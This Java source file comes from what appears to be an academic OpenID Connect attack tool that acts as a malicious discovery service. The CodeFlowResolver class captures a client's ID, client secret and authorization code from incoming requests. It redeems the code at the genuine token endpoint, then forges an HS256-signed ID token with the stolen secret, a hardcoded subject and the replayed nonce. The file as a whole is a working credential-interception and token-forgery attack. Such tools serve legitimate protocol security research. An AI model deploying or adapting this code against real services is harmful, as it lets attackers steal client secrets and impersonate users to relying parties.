package de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.utils;

import com.nimbusds.jose.JOSEException;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.JWSObject;
import com.nimbusds.jose.Payload;
import com.nimbusds.jose.crypto.MACSigner;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.oauth2.sdk.ParseException;
import com.nimbusds.oauth2.sdk.SerializeException;
import com.nimbusds.oauth2.sdk.auth.ClientSecretBasic;
import com.nimbusds.oauth2.sdk.auth.Secret;
import com.nimbusds.oauth2.sdk.http.HTTPRequest;
import com.nimbusds.oauth2.sdk.http.HTTPResponse;
import com.nimbusds.oauth2.sdk.id.Audience;
import com.nimbusds.oauth2.sdk.id.Issuer;
import com.nimbusds.oauth2.sdk.id.Subject;
import com.nimbusds.oauth2.sdk.token.AccessToken;
import com.nimbusds.oauth2.sdk.token.BearerAccessToken;
import com.nimbusds.oauth2.sdk.token.RefreshToken;
import com.nimbusds.openid.connect.sdk.Nonce;
import com.nimbusds.openid.connect.sdk.OIDCAccessTokenResponse;
import com.nimbusds.openid.connect.sdk.claims.IDTokenClaimsSet;
import de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.controller.ConfigurationManager;
import de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.controller.Database;
import de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.exceptions.AccessTokenResolverException;
import de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.exceptions.CodeFlowResolverException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.slf4j.LoggerFactory;

/**
 *
 * @author Vladislav Mladenov<vladislav.mladenov@rub.de>
 */
public class CodeFlowResolver {
    private static final org.slf4j.Logger log = LoggerFactory.getLogger(CodeFlowResolver.class);
    
    public static InterceptedData resolve(HTTPRequest httpRequest) throws CodeFlowResolverException {
        InterceptedData data;
        try {
            data = getCredentials(httpRequest);
            data.setHttpParameters(httpRequest.getQueryParameters());

        } catch (IOException | ParseException | NullPointerException ex) {
            throw new CodeFlowResolverException(ex.toString());
        }

        try {
            data = AccessTokenResolver.resolve(ConfigurationManager.getCfgManager().getTokenEndpoint(), data);
        } catch (AccessTokenResolverException ex) {
            data.setAccess_token("Cannot resolve AccessToken" + ex.toString());
        }

        return data;
    }

    private static InterceptedData getCredentials(HTTPRequest httpRequest) throws IOException, ParseException, NullPointerException {
        InterceptedData data;

        ClientSecretBasic credentials = ClientSecretBasic.parse(httpRequest);
        String code = httpRequest.getQueryParameters().get("code");
        String redirect_uri = httpRequest.getQueryParameters().get("redirect_uri");

        data = new InterceptedData(code, credentials.getClientID().getValue(), credentials.getClientSecret().getValue());
        data.setRedirect_uri(redirect_uri);

        return data;
    }

    public static HTTPResponse getOIDCAccessTokenResponse(InterceptedData data){
        try {
            OIDCAccessTokenResponse oidcToken;
            
            oidcToken = new OIDCAccessTokenResponse(new BearerAccessToken(data.getAccess_token()), new RefreshToken(data.getAccess_token()), "");
            
            IDTokenClaimsSet claimSet = generateIDToken(data);
            // Create an HMAC-protected JWS object with some payload
            
            JWSObject jwsObject = new JWSObject(new JWSHeader(JWSAlgorithm.HS256), new Payload(claimSet.toJSONObject()));
            
            // Apply the HMAC to the JWS object
            jwsObject.sign(new MACSigner(new Secret(data.getClient_secret()).getValueBytes()));
            
            // Serialise to URL-safe format
            oidcToken = new OIDCAccessTokenResponse(new BearerAccessToken(data.getAccess_token()), new RefreshToken(data.getAccess_token()), jwsObject.serialize());
            
            return oidcToken.toHTTPResponse();
        } catch (JOSEException | SerializeException ex) {
            Logger.getLogger(CodeFlowResolver.class.getName()).log(Level.SEVERE, null, ex);
            return null;
        }
    }

    private static IDTokenClaimsSet generateIDToken(InterceptedData data) {
        try {
            Issuer iss = new Issuer(ConfigurationManager.getCfgManager().getDatabase().getConfigIssuer());
            
            Subject sub;
            String subjectString = "90342.ASDFJWFA";
            sub = new Subject(subjectString);
            
            JWSObject jswObj = JWSObject.parse(data.getId_token());
            JWTClaimsSet jwtClaimsSet = JWTClaimsSet.parse(jswObj.getPayload().toString());
            IDTokenClaimsSet idTokenClaimsSet = new IDTokenClaimsSet(jwtClaimsSet);
            
            List<Audience> audience = new ArrayList();
            audience.add(new Audience(data.getClient_id()));
            
            Date issueDate = new Date();
            Date expirationDate = new Date(System.currentTimeMillis() + 120 * 1000);
            IDTokenClaimsSet claimSet = new IDTokenClaimsSet(iss, sub, audience, expirationDate, issueDate);
            claimSet.setNonce(idTokenClaimsSet.getNonce());
            
            return claimSet;
        } catch (ParseException | java.text.ParseException ex) {
            Logger.getLogger(CodeFlowResolver.class.getName()).log(Level.SEVERE, null, ex);
            return null;
        }
    }
}
